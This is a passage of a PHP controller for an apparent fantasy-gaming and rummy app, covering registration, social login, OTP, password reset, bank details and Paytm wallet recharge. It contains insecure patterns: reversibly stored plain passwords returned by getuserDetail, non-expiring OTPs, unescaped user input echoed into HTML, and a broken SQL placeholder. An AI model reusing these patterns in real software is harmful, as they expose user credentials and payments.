           $stmt->bindParam(':logindate', $created);
           $stmt->bindParam(':socialid', $socialid);
           $stmt->bindParam(':logintype', $logintype);
           $stmt->bindParam(':logindate', $created);
           $stmt->bindParam(':passwordplain', $passwordplainEnc);

           if ($stmt->execute()) {
               $lastId = $this->db->lastInsertId();

               $refSql = "";
               $digits = 4;
               $newrefercode = REFPREFIX . rand(pow(10, $digits - 1), pow(10, $digits) - 1) . $lastId;
               $parm   = ["refercode" => $newrefercode, "id" => $lastId];

               $this->updateTransaction($lastId, $wlcbns, $created, $lastId, CR, WELCOMEBNS, WLTBNS, 0, $wlcbns);

               if (!empty($refercode)) {
                   $prebal = $wlcbns;
                   $curbal = $newusrbns;
                   $this->updateRefferBns($refusrid, $lastId, $refbns, $created, $prebal, $curbal, $refbnsto);
               }

               $userprofile = $this->db->prepare("INSERT INTO userprofile(userid,teamname,updated,profilepic,dob,state) VALUES (:userid,:teamname,:updated,:profilepic,:dob,:state)");
               $userprofile->execute(["userid" => $lastId, "updated" => $created, "teamname" => $tmname, "profilepic" => $profilepic, "dob" => $dob, "state" =>$state_name]);

               $updaterefercode = $this->db->prepare("UPDATE users SET refercode = :refercode WHERE id = :id ");
               $updaterefercode->execute($parm);
               $userInfoRes = $this->security->getUserDetail($lastId);
               $token       = $this->security->tokenGenerate($userInfoRes);

               $userInfo['id'] 		= $userInfoRes['id'];
               $userInfo['username'] 	= $userInfoRes['username'];
               $userInfo['phone'] 		= $userInfoRes['phone'];
               $userInfo['email'] 		= $userInfoRes['email'];
               $userInfo['name'] 		= $userInfoRes['name'];
               $userInfo['address'] 	= $userInfoRes['address'];
               $userInfo['city'] 		= $userInfoRes['city'];
               $userInfo['state'] 		= $userInfoRes['state'];
               $userInfo['refercode'] 	= $userInfoRes['refercode'];
               $userInfo['teamname'] 	= $userInfoRes['teamname'];
               $userInfo['gender'] 	= $userInfoRes['gender'];
               $userInfo['secondaryemail'] = $userInfoRes['secondaryemail'];
               $userInfo['dob'] 			= $userInfoRes['dob'];
               $userInfo['profilepic'] 	= $userInfoRes['profilepic'];
               $userInfo['istnameedit'] 	= $userInfoRes['istnameedit'];
               $userInfo['isphoneverify'] 	= $userInfoRes['isphoneverify'];
               $userInfo['isemailverify'] 	= $userInfoRes['isemailverify'];
               $userInfo['ispanverify'] 	= $userInfoRes['ispanverify'];
               $userInfo['isbankdverify'] 	= $userInfoRes['isbankdverify'];


               $stmt = $this->db->prepare("DELETE FROM userstemp WHERE phone=:phone");
               $params = ["phone" => $phone];
               $stmt->execute($params);

               $this->db->commit();
               $this->sendWelcomeMail($userInfo['email'],$userInfo['name'],$settings['settings']['webname']);

               $resArr['code']  = 0;
               $resArr['error'] = false;
               $resArr['msg']   = 'User Registered successfully.';
               $resArr['data']  =  ['token' => $token, 'userinfo' => $this->security->removenull($userInfo)];

               //rummy login
               $unm = ($logintype == 'N') ? $userInfoRes['phone'] : $userInfoRes['socialid'];
               $rumregdata = [
                   'phone' => $userInfoRes['phone'],
                   'email' => $userInfoRes['email'],
                   'username' => $unm,
                   'password' => \Security::$pass,
                   'sid' => $token,
                   'tname' => $userInfoRes['teamname']
               ];
               $rumRes = $this->security->callCurl("login", $rumregdata, "POST");
               $rumRes1 = $this->security->callCurl("triggerAfterLogin", $rumregdata, "POST");
           } else {
               $resArr['code']  = 1;
               $resArr['error'] = true;
               $resArr['msg'] = 'Otp is not verified,Enter correct value.';
           }
       } catch (PDOException $e) {
           $resArr['code']  = 1;
           $resArr['error'] = true;
           $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
           $code = $errcode;
           $this->db->rollBack();
       }
       return $response->withJson($resArr, $code);
   }

    public function getuserDetail($userid)
    {
        $userInfoRes = $this->security->getUserDetail($userid);
        $token    	 = $this->security->tokenGenerate($userInfoRes);

        $userInfo['id'] = $userInfoRes['id'];
        $userInfo['username'] = $userInfoRes['username'];
        $userInfo['phone'] = $userInfoRes['phone'];
        $userInfo['email'] = $userInfoRes['email'];
        $userInfo['name'] = $userInfoRes['name'];
        $userInfo['address'] = $userInfoRes['address'];
        $userInfo['city'] = $userInfoRes['city'];
        $userInfo['state'] = $userInfoRes['state'];
        $userInfo['refercode'] = $userInfoRes['refercode'];
        $userInfo['teamname'] = $userInfoRes['teamname'];
        $userInfo['gender'] = $userInfoRes['gender'];
        $userInfo['secondaryemail'] = $userInfoRes['secondaryemail'];
        $userInfo['dob'] = $userInfoRes['dob'];
        $userInfo['profilepic'] = $userInfoRes['profilepic'];
        $userInfo['isphoneverify'] = $userInfoRes['isphoneverify'];
        $userInfo['isemailverify'] = $userInfoRes['isemailverify'];
        $userInfo['ispanverify'] = $userInfoRes['ispanverify'];
        $userInfo['isbankdverify'] = $userInfoRes['isbankdverify'];
        $userInfo['passwordplain'] = $userInfoRes['passwordplain'];
        $userInfo['socialid'] 	   = $userInfoRes['socialid'];

        return ['token' => $token, 'userinfo' => $this->security->removenull($userInfo)];
    }


    /* Social Login Function */
    public function socialLoginFunc($request, $response)
    {
        global $settings;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        //$imgSizeLimit = $settings['settings']['code']['imgSizeLimit'];

        $input = $request->getParsedBody();
        $check =  $this->security->validateRequired(['email', 'socialid', 'logintype'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }
        $phone 	 	 = 	'';
        $email 	 	 = 	str_replace(" ", "", $input['email']);
        $socialid 	 = 	$input['socialid'];
        $logintype 	 = 	$input['logintype'];
        $refercode 	 = 	"";

        $ip 		 =  \Security::getIpAddr();
        $browser 	 = 	$this->security->getBrowserinfo();
        $created  	 = 	time();
        $usertype 	 = 	USER;
        $email 		 = 	strtolower($email);
        $password    = 	"";
        $devicetype  =  "";
        $devicetoken =  "";
        $logindate   =  time();
        $dtoken 	 =  "";

        if (isset($input['phone'])) {
            $phone = $input['phone'];
        }

        if (isset($input['devicetype'])) {
            $devicetype  = 	$input['devicetype'];
            if (!in_array($devicetype, ['android', 'iphone', 'web'])) {
                $resArr = $this->security->errorMessage("Device type not exists");
                return $response->withJson($resArr, $errcode);
            }
        }

        if (in_array($devicetype, ['android', 'iphone'])) {
            $dtoken = ",devicetoken = :devicetoken";
        }

        if (isset($input['devicetoken'])) {
            $devicetoken  = $input['devicetoken'];
        }



        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $resArr = $this->security->errorMessage("Invalid email address");
            return $response->withJson($resArr, $errcode);
        }

        if (!in_array($logintype, ['F', 'G'])) {
            $resArr = $this->security->errorMessage("Invalid logintype");
            return $response->withJson($resArr, $errcode);
        }

        $ckSid = $this->security->socialidExist($socialid);
        $ckUsrScl = $this->security->ckUserSocialLogin($email, $socialid);

        if (!empty($ckUsrScl)) {
            /*if(empty($ckSid))
        {
            $resArr = $this->security->errorMessage("You not login with this social account");
            return $response->withJson($resArr,$errcode);
        }   */
            if ($ckUsrScl['status'] == INACTIVESTATUS || $ckUsrScl['status'] == BLOCK) {
                $resArr = $this->security->errorMessage("User may be Inactive or Blocked, contact to webmaster");
                return $response->withJson($resArr, $errcode);
            }

            $otp = 0;
            $uid = $ckUsrScl['id'];

            $updateusertb = $this->db->prepare("UPDATE users SET devicetype = :devicetype,logindate=:logindate,otp=:otp,ip=:ip " . $dtoken . " WHERE id = :id ");
            $updateusertb->bindParam(':id', $uid);
            $updateusertb->bindParam(':devicetype', $devicetype);
            if ($dtoken) {
                $updateusertb->bindParam(':devicetoken', $devicetoken);
            }
            $updateusertb->bindParam(':logindate', $logindate);
            $updateusertb->bindParam(':otp', $otp);
            $updateusertb->bindParam(':ip', $ip);
            $updateusertb->execute();


            $ud = $this->getuserDetail($ckUsrScl['id']);

            //rummy login
            $unm = $ud['userinfo']['socialid'];
            unset($ud['userinfo']['passwordplain']);
            unset($ud['userinfo']['socialid']);

            $rumregdata = [
                'phone' => $ud['userinfo']['phone'],
                'email' => $ud['userinfo']['email'],
                'username' => $unm,
                'password' => \Security::$pass,
                'sid' => $ud['token'],
                'tname' => $ud['userinfo']['teamname']
            ];
            $rumRes = $this->security->callCurl("login", $rumregdata, "POST");
            $rumRes1 = $this->security->callCurl("triggerAfterLogin", $rumregdata, "POST");

            $resArr['code']  = 0;
            $resArr['error'] = false;
            $resArr['msg']   = 'User login successfully.';
            $resArr['data']  =  $ud;
            return $response->withJson($resArr, $errcode);
        }

        if (!isset($input['phone']) && empty($input['phone'])) {
            $resArr = $this->security->errorMessage("phone number required", 5);
            return $response->withJson($resArr, $errcode);
        }

        $phone = $input['phone'];
        if (!filter_var($phone, FILTER_VALIDATE_INT)) {
            $resArr = $this->security->errorMessage("Invalid phone number");
            return $response->withJson($resArr, $errcode);
        }

        $ckEmail = $this->security->emailExisting($email);
        $ckSid 	 = $this->security->socialidExist($socialid);
        $ckPhone = $this->security->phoneExisting($phone);

        if (!empty($ckEmail) ||  !empty($ckSid)) {
            $resArr = $this->security->errorMessage("You are already registered with this email");
            return $response->withJson($resArr, $errcode);
        }

        if (!empty($ckPhone)) {
            $resArr = $this->security->errorMessage("You are already registered with this phone number");
            return $response->withJson($resArr, $errcode);
        }

        if (isset($input['refercode']) && !empty($input['refercode'])) {
            $refercode  = $input['refercode'];
            $chkRefCode = $this->security->checkRefferCode($refercode);
            if (empty($chkRefCode)) {
                $resArr = $this->security->errorMessage("Invalid referral code");
                return $response->withJson($resArr, $errcode);
            }
        }

        $otp = \Security::generateOtp();

        try {
            $this->db->beginTransaction();
            $stmt = $this->db->prepare("DELETE FROM userstemp WHERE phone=:phone");
            $params = ["phone" => $phone];
            $stmt->execute($params);
            $stmt = $this->db->prepare("INSERT INTO userstemp (phone,email,otp,refercode,ip,created,password,socialid,logintype) VALUES (:phone,:email,:otp,:refercode,:ip,:created,:password,:socialid,:logintype)");

            $params = ["phone" => $phone, "email" => $email, "otp" => $otp, "refercode" => $refercode, "ip" => $ip, "created" => $created, "password" => $password, "socialid" => $socialid, "logintype" => $logintype];
            if ($stmt->execute($params)) {
                $msg = str_replace('OTPCODE', $otp, $settings['settings']['msg']['otp']);
                \Security::sendSms($phone, $msg);

                $this->db->commit();
                $resArr['code']  = 6;
                $resArr['error'] = false;
                $resArr['msg'] = 'Verify your otp.';
            } else {
                $resArr = $this->security->errorMessage("Otp not generated, Please try again.");
                return $response->withJson($resArr, $errcode);
            }
        } catch (\PDOException $e) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
            $code = $errcode;
            $this->db->rollBack();
        }
        return $response->withJson($resArr, $code);
    }


    /*resend otp api (start)*/
    public function resendotpFunc($request, $response)
    {
        global $settings;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $input = $request->getParsedBody();
        $check =  $this->security->validateRequired(['username', 'atype'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }

        $username  		= $input['username'];
        $atype  		= $input['atype'];

        $unamemsg       = "";
        $untype			= "phone";
        $checkUser      = '';

        /* $devicetoken  = $input['devicetoken'];
        $devicetype   	= $input['devicetype'];*/

        if (!in_array($atype, ['forget', 'newreg'])) {
            $resArr = $this->security->errorMessage("Invalid atype");
            return $response->withJson($resArr, $errcode);
        }

        $otp = \Security::generateOtp();

        try {
            if ($atype == "forget") {
                if (strpos($username, '@') !== false) {
                    if (!filter_var($input['username'], FILTER_VALIDATE_EMAIL)) {
                        $resArr = $this->security->errorMessage("Invalid email address");
                        return $response->withJson($resArr, $errcode);
                    }

                    $unamemsg = "email address";
                    $untype = "email";
                } else {
                    if (!filter_var($username, FILTER_VALIDATE_INT)) {
                        $resArr = $this->security->errorMessage("Invalid phone number");
                        return $response->withJson($resArr, $errcode);
                    }
                    $unamemsg = "phone number";
                }

                $checkUser = $this->security->checkUsernameExist($username);
                if (empty($checkUser)) {
                    $resArr = $this->security->errorMessage("This " . $unamemsg . " is not registered or the account has been deactivated");
                    return $response->withJson($resArr, $errcode);
                }
                $updaterefercode = $this->db->prepare("UPDATE users SET otp=:otp WHERE id=:id");
                $id = $checkUser['id'];

                if (!$updaterefercode->execute(["otp" => $otp, 'id' => $id])) {
                    $resArr = $this->security->errorMessage("Otp not generated. Try again.");
                    return $response->withJson($resArr, $errcode);
                }
            }

            if ($atype == "newreg") {
                if (!filter_var($username, FILTER_VALIDATE_INT)) {
                    $resArr = $this->security->errorMessage("Invalid phone number");
                    return $response->withJson($resArr, $errcode);
                }

                $stmt = $this->db->prepare("UPDATE userstemp SET otp=:otp WHERE phone = :phone");
                if (!$stmt->execute(["phone" => $username, "otp" => $otp])) {
                    $resArr = $this->security->errorMessage("Invalid phone, try again.");
                    return $response->withJson($resArr, $errcode);
                }
            }
            if (!empty($otp)) {
                if ($untype == "email") {
                    $mdata['email'] = $username;
                    $mdata['otp']  = $otp;
                    $mdata['subject']  = APP_NAME . " One Time Password";
                    $mdata['template'] = "otpmail.php";
                    $this->sendMail($mdata);
                /*	$this->mailer->sendMessage('/mail/otpmail.php', ['data' => $mdata], function($message) use($mdata) {
                        $message->setTo($mdata['email'],$mdata['email']);
                        $message->setSubject(APP_NAME." One Time Password");
                }); */
                } else {
                    $msg = str_replace('OTPCODE', $otp, $settings['settings']['msg']['otp']);
                    \Security::sendSms($username, $msg);
                }
                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg'] = 'OTP has been sent';
            } else {
                $resArr['code']  = 1;
                $resArr['error'] = true;
                $resArr['msg'] = 'Otp not generated,try again';
            }
        } catch (\PDOException $e) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
            $code = $errcode;
        }

        return $response->withJson($resArr, $code);
    }

    /*Forget password*/
    public function resetpasswordFunc($request, $response)
    {
        global $settings;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $input = $request->getParsedBody();

        $check =  $this->security->validateRequired(['username', 'otp', 'password'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }
        $username  		= strtolower($input['username']);
        $otp  			= $input['otp'];
        $password  		= $input['password'];
        $unamemsg       = "";


        if (preg_match("/^.*(?=.{8,})(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z]).*$/", $password) === 0) {
            $resArr = $this->security->errorMessage("Password must be at least 8 characters and must contain at least one lower case letter, one upper case letter and one digit");
            return $response->withJson($resArr, $errcode);
        }

        if (strpos($username, '@') !== false) {
            if (!filter_var($input['username'], FILTER_VALIDATE_EMAIL)) {
                $resArr = $this->security->errorMessage("Invalid email address.");
                return $response->withJson($resArr, $errcode);
            }
            $unamemsg = "email address";
        } else {
            if (!filter_var($username, FILTER_VALIDATE_INT)) {
                $resArr = $this->security->errorMessage("Invalid phone number.");
                return $response->withJson($resArr, $errcode);
            }
            $unamemsg = "phone number";
        }


        $checkUser = $this->security->checkUsernameExist($username);
        if (empty($checkUser)) {
            $resArr = $this->security->errorMessage("This " . $unamemsg . " is not registered or the account has been deactivated");
            return $response->withJson($resArr, $errcode);
        }

        try {
            $sql = "SELECT id FROM users WHERE (phone=:username OR email=:username ) AND otp=:otp";
            $stmt = $this->db->prepare($sql);
            $stmt->execute(['username' => $username, 'otp' => $otp]);
            $res = $stmt->fetch();

            if (!empty($res)) {
                $password = $this->security->encryptPassword($password);

                $sql = "update users set password = :password,otp=0 WHERE (phone=:username OR email=:username ) AND id=:id";
                $stmt = $this->db->prepare($sql);
                $stmt->bindParam(':id', $res['id']);
                $stmt->bindParam(':username', $username);
                $stmt->bindParam(':password', $password);
                $stmt->execute();

                //echo $stmt->rowCount() ; die;

                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg']   = 'Password updated successfully.';
            } else {
                $resArr['code']  = 1;
                $resArr['error'] = true;
                $resArr['msg'] 	 = 'Incorrect Otp,use correct otp.';
            }
        } catch (\PDOException $e) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
            $code = $errcode;
        }

        return $response->withJson($resArr, $code);
    }


    /*Change password*/
    public function changepasswordFunc($request, $response)
    {
        global $settings;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $loginuser = $request->getAttribute('decoded_token_data');
        $uid 	   = $loginuser['id'];
        $input = $request->getParsedBody();
        $check =  $this->security->validateRequired(['oldpassword', 'password'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }
        $oldpassword  	= $input['oldpassword'];
        $password  		= $input['password'];

        if (preg_match("/^.*(?=.{8,})(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z]).*$/", $password) === 0) {
            $resArr = $this->security->errorMessage("Password must be at least 8 characters and must contain at least one lower case letter, one upper case letter and one digit");
            return $response->withJson($resArr, $errcode);
        }
        $pass = $this->security->encryptPassword($oldpassword);
        $stmt = $this->db->prepare("SELECT id FROM users WHERE password=:password AND id=:id");
        $stmt->execute(['password' => $pass, 'id' => $uid]);
        $res = $stmt->fetch();

        if (empty($res)) {
            $resArr = $this->security->errorMessage("Old password not match");
            return $response->withJson($resArr, $errcode);
        }
        $pass = \Security::encryptPassword($password);

        try {
            $sql = "UPDATE users SET password=:password WHERE id=:id ";
            $stmt = $this->db->prepare($sql);

            if ($stmt->execute(['password' => $pass, 'id' => $uid])) {
                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg']   = 'Password updated successfully.';
            } else {
                $resArr['code']  = 1;
                $resArr['error'] = true;
                $resArr['msg'] 	 = 'Password not changed, Try again.';
            }
        } catch (Exception $e) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
            $code = $errcode;
        }

        return $response->withJson($resArr, $code);
    }

    public function updateBankDetails($request, $response)
    {
        global $settings, $baseurl;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $imgSizeLimit = $settings['settings']['code']['bankImgLimit'];

        $loginuser = $request->getAttribute('decoded_token_data');
        $uid 	   = $loginuser['id'];

        $input = $request->getParsedBody();

        $check =  $this->security->validateRequired(['acno', 'ifsccode', 'bankname', 'acholdername'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }

        $key = \Security::generateKey($uid);

        $acno   		= $input['acno'];
        $ifsccode   	= $input['ifsccode'];
        $bankname 		= $input['bankname'];
        $acholdername 	= $input['acholdername'];
        $state 			= @$input['state'];

        if (empty($_FILES['image'])) {
            $resArr = $this->security->errorMessage("Please select image");
            return $response->withJson($resArr, $errcode);
        }

        $rst = $this->security->ifsccodeCheck($ifsccode);
        if ($rst['error'] == true) {
            $resArr = $this->security->errorMessage("Invalid IFSC code");
            return $response->withJson($resArr, $errcode);
        }
        if (strlen($acno) < 8 || strlen($ifsccode) < 4) {
            $resArr = $this->security->errorMessage("Please check acno or ifsccode length");
            return $response->withJson($resArr, $errcode);
        }

        /*$colIfscData = $this->mdb->ifscdata;
        $resIfsc = $colIfscData->findOne(['IFSC'=>$ifsccode]);
        if(empty($resIfsc)){
        	$resArr = $this->security->errorMessage("Invalid IFSC Code");
            return $response->withJson($resArr,$errcode);
        }
        if($resIfsc['BANK'] != $bankname ){
        	$resArr = $this->security->errorMessage("Invalid Bankname");
            return $response->withJson($resArr,$errcode);
        }*/

        $acno   = \Security::my_encrypt($acno, $key);
        $ifsccode = \Security::my_encrypt($ifsccode, $key);

        $files = $_FILES['image'];

        $dir = './uploads/banks/';
        $img = explode('.', $files["name"]);
        $ext = end($img);
        if (($files["size"] / 1024) > $imgSizeLimit) {
            $resArr = $this->security->errorMessage("Image size should be less than " . $imgSizeLimit . " KB.");
            return $response->withJson($resArr, $errcode);
        }
        if (!in_array($ext, ['jpg', 'jpeg', 'png'])) {
            $resArr = $this->security->errorMessage("invalid image format.");
            return $response->withJson($resArr, $errcode);
        }
        $imgname = time() . '_' . $files["name"];
        $imgname = str_replace(" ", "", $imgname);
        $imgname = preg_replace('/[^A-Za-z0-9\-]/', '', $imgname);
        $target_file = $dir . $imgname;

        if (!move_uploaded_file($files["tmp_name"], $target_file)) {
            $resArr = $this->security->errorMessage("Image not uploaded, There is some problem");
            return $response->withJson($resArr, $errcode);
        }

        try {
            $getbankac = $this->security->getbankac($uid);
            if (empty($getbankac)) {
                $params = ["userid" => $uid, "acno" => $acno, "ifsccode" => $ifsccode, "bankname" => $bankname, "acholdername" => $acholdername, "image" => $imgname, 'state' => $state];
                $stmt = $this->db->prepare("INSERT INTO userbankaccounts (userid,acno,ifsccode,bankname,acholdername,image,state) VALUES (:userid,:acno,:ifsccode,:bankname,:acholdername,:image,:state)");
            } else {
                $id = $getbankac['id'];
                $isverified = INACTIVESTATUS;
                $params = ["userid" => $uid, "acno" => $acno, "ifsccode" => $ifsccode, "bankname" => $bankname, "acholdername" => $acholdername, "id" => $id, "isverified" => $isverified, "image" => $imgname, 'state' => $state];
                $stmt = $this->db->prepare("UPDATE userbankaccounts SET acno=:acno,ifsccode=:ifsccode,bankname=:bankname,acholdername=:acholdername,isverified=:isverified,image=:$imgname,state=:state WHERE id=:id AND userid=:userid");
            }
            if ($stmt->execute($params)) {
                $params = ["userid" => $uid, "isbankdverify" => INACTIVESTATUS];
                $stmt = $this->db->prepare("UPDATE users SET isbankdverify=:isbankdverify WHERE id=:userid");
                $stmt->execute($params);

                $this->security->kycNoti($uid, "verify bankaccount", "Bankaccount updated,check and confirm");

                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg']   = 'Bankaccount details update successfully.';
            } else {
                $resArr['code']  	= 1;
                $resArr['error'] 	= true;
                $resArr['msg'] 		= 'Bankaccount details not updated, There is some problem';
            }
        } catch (\PDOException $e) {
            $resArr['code'] 	= 1;
            $resArr['error']	= true;
            $resArr['msg']  	= \Security::pdoErrorMsg($e->getMessage());
            $code 				= $errcode;
        }
        return $response->withJson($resArr, $code);
    }

    // Generate checksum
    public function generatechecksumFunc($request, $response)
    {
        global $settings, $baseurl;
        $code       =  	$settings['settings']['code']['rescode'];
        $errcode    =  	$settings['settings']['code']['errcode'];
        $loginuser 	= 	$request->getAttribute('decoded_token_data');
        $uid 		= 	$loginuser['id'];
        $input      = 	$request->getParsedBody();
        $dataResArr = 	[];

        $check = $this->security->validateRequired(['orderid', 'custid', 'txnamount'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }

        $amt = $input['txnamount'];
        $t 	 = time();
        $promocode = '';
        $pcodeid   = '';
        if (isset($input['pcode']) && !empty($input['pcode'])) {
            $promocode = $input['pcode'];
            $result = $this->security->isPromoCodeValid(['amount' => $amt, 'pcode' => $promocode, 'userid' => $uid]);
            if (!empty($result) && $result['resArr']['code'] == 0) {
                $pcodeid = $result['resArr']['data']['id'];
            } else {
                $resArr = $this->security->errorMessage($result['resArr']['msg']);
                return $response->withJson($result['resArr'], $result['code']);
            }
        }

        try {
            $stmt = $this->db->prepare("INSERT INTO orders (userid,created,amount) VALUES (:userid,:created,:amount)");
            $stmt->bindParam(':userid', $uid);
            $stmt->bindParam(':created', $t);
            $stmt->bindParam(':amount', $amt);

            if (!$stmt->execute()) {
                $resArr = $this->security->errorMessage("There is some problem");
                return $response->withJson($resArr, $errcode);
            }

            $lastId = $this->db->lastInsertId();
            $tm = time();

            $paramList["MID"] 		 	= PAYTM_MERCHANT_MID;
            //$paramList["ORDER_ID"] 	 	= $uid.'-'.$lastId.'-'.$tm;
            $paramList["ORDER_ID"] 		= (!empty($pcodeid)) ? $uid . '-' . $lastId . '-' . $t . '-' . $pcodeid : $uid . '-' . $lastId . '-' . $t;
            $paramList["CUST_ID"] 	 	= $input['custid'];
            $paramList["INDUSTRY_TYPE_ID"] = 'Retail';
            $paramList["CHANNEL_ID"] 	= 'WEB';
            $paramList["TXN_AMOUNT"] 	= $input['txnamount'];
            $paramList["WEBSITE"] 	 	= PAYTM_MERCHANT_WEBSITE;
            $paramList["CALLBACK_URL"] 	= CALLBACKURL;

            $checkSum = getChecksumFromArray($paramList, PAYTM_MERCHANT_KEY);

            if (!empty($checkSum)) {
                $paramList['checksum'] =  $checkSum;
                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg']   = "checksum.";
                $resArr['data']  = $paramList;
            } else {
                $resArr['code']  = 1;
                $resArr['error'] = true;
                $resArr['msg']   = "No result.";
            }
        } catch (\PDOException $e) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
            $code = $errcode;
        }
        return $response->withJson($resArr, $code);
    }


    //Get transaction by order id
    public function gettxbyorderidFunc($request, $response)
    {
        global $settings, $baseurl;
        $code       =  	$settings['settings']['code']['rescode'];
        $errcode    =  	$settings['settings']['code']['errcode'];
        $loginuser 	= 	$request->getAttribute('decoded_token_data');
        $uid 		= 	$loginuser['id'];
        $input      = 	$request->getParsedBody();
        $dataResArr = 	[];
        $check = $this->security->validateRequired(['orderid'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }

        $orderid  =  $input["orderid"];

        try {
            $params = ["atype" => ADDBAL, "docid" => $orderid, "userid" => $uid];
            $sql = "SELECT tp.docid,tp.amount,tp.txid,tc.pmode,tp.status,tc.gatewayname,tp.txdate FROM transactions tp LEFT JOIN transactionchild tc ON tp.id=tc.tid WHERE (tp.docid=:docid AND tp.atype=:atype) AND tp.userid=:userid";

            $stmt 	= $this->db->prepare($sql);
            $stmt->execute($params);
            $res 	= $stmt->fetch();

            if (!empty($res)) {
                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg']   = "Transaction.";
                $resArr['data']  = $this->security->removenull($res);
            } else {
                $resArr['code']  = 1;
                $resArr['error'] = true;
                $resArr['msg']   = "Record not found.";
            }
        } catch (\PDOException $e) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
            $code = $errcode;
        }
        return $response->withJson($resArr, $code);
    }


    //wallet Recharge
    public function walletRecharge($request, $response)
    {
        global $settings, $baseurl;
        $code       =  	$settings['settings']['code']['rescode'];
        $errcode    =  	$settings['settings']['code']['errcode'];
        $loginuser 	= 	$request->getAttribute('decoded_token_data');
        $uid 		= 	$loginuser['id'];
        //$uid 		= 	98;

        $input      = 	$request->getParsedBody();
        $dataResArr = 	[];
        $check = $this->security->validateRequired(['amount'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }

        $promocode = '';
        $pcodeid   = '';
        $amount    = $input['amount'];

        if (isset($input['pcode']) && !empty($input['pcode'])) {
            $promocode = $input['pcode'];
            $result = $this->security->isPromoCodeValid(['amount' => $amount, 'pcode' => $promocode, 'userid' => $uid]);
            if (!empty($result) && $result['resArr']['code'] == 0) {
                $pcodeid = $result['resArr']['data']['id'];
            } else {
                $resArr = $this->security->errorMessage($result['resArr']['msg']);
                return $response->withJson($result['resArr'], $result['code']);
            }
        }

        //$amount = 10;
        $t      = time();
        $checkSum  = "";
        $paramList = array();
        $stmt = $this->db->prepare("INSERT INTO orders (userid,created,amount) VALUES (:userid,:created,:amount)");
        $stmt->bindParam(':userid', $uid);
        $stmt->bindParam(':created', $t);
        $stmt->bindParam(':amount', $amount);

        if (!$stmt->execute()) {
            $resArr = $this->security->errorMessage("There is some problem");
            return $response->withJson($resArr, $errcode);
        }

        $lastId = $this->db->lastInsertId();

        $paramList["MID"] 		 	   = PAYTM_MERCHANT_MID;
        $paramList["ORDER_ID"] 		   = (!empty($pcodeid)) ? $uid . '-' . $lastId . '-' . $t . '-' . $pcodeid : $uid . '-' . $lastId . '-' . $t;
        //$paramList["ORDER_ID"] 	 	   = $uid.'-'.$lastId.'-'.$t;
        $paramList["CUST_ID"] 	 	   = $uid;
        $paramList["INDUSTRY_TYPE_ID"] = INDUSTRY_TYPE_ID;
        $paramList["CHANNEL_ID"] 	   = CHANNEL_ID;
        $paramList["TXN_AMOUNT"] 	   = $amount;
        $paramList["CALLBACK_URL"] 	   = CALLBACKURL_MOBILE_APP;
        $paramList["WEBSITE"] 	 	   = PAYTM_MERCHANT_WEBSITE;


        $checkSum = getChecksumFromArray($paramList, PAYTM_MERCHANT_KEY);
        $paramList["CHECKSUMHASH"] = $checkSum;

        //file_put_contents("gen_para_list1.txt", print_r(json_encode($paramList),true));

        $html = '<html><head>
        <title>' . APP_NAME . '</title></head><body>
        <center><h1>Please do not refresh this page... </h1></center>';
        $html .= '<form method="post" action="' . PAYTM_TXN_URL . '" name="form1">
        <table border="1">
            <tbody>';

        foreach ($paramList as $name => $value) {
            if ($name == 'CALLBACK_URL') {
                $html .= '<input type="hidden" id="callbackurl" name="' . $name . '" value="' . $value . '">';
            } else {
                $html .= '<input type="hidden" name="' . $name . '" value="' . $value . '">';
            }
        }

        $html .= '</tbody></table><script type="text/javascript"> document.form1.submit(); </script></form></body></html>';
        echo $html;
        exit;
    }

    public function walletCallback($request, $response)
    {
        global $settings;
        $code = $settings['settings']['code']['rescode'];
        $data = $request->getParsedBody();
        $res  = array();

        try {

            //file_put_contents("pytm_1.txt", print_r(json_encode($data),true));
            $res = $this->paytm_wallet_callback($data);

            if (isset($res['STATUS']) && ($res['STATUS'] != 'TXN_SUCCESS')) {
                $resArr['code']  = 1;
                $resArr['error'] = true;
                $resArr['msg']   = $res['RESPMSG'];
                $resArr['data']  = $res;
            } else {
                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg']   = "Transaction successfull with amount " . $res['TXNAMOUNT'] . ".";
                $resArr['data']  = $this->security->removenull($res);
            }
        } catch (\PDOException $e) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
        }

        return $response->withJson($resArr, $code);
    }

